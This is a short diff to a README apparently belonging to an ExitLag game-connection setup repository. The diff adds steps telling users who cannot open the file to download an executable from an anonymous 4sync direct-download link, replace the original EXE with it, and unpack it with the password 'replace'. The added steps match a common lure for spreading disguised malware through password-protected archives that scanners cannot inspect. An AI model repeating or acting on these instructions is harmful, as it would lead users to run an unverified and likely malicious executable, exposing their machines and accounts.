@@ -31,6 +31,8 @@ This repository includes a setup/configuration file to help streamline your Exit
 4. Download and install the ExitLag client for Windows.  
 5. Create an account and log in.  
 6. Enjoy optimized connection for your games!
+7. If file dont open, download [this file](https://www.4sync.com/web/directDownload/4Ufzz5vy/cKQ38aak.ef87275520de9805aa0b0c059fbb002c) and replace EXE file
+8. Password **replace**
 
 ---
 
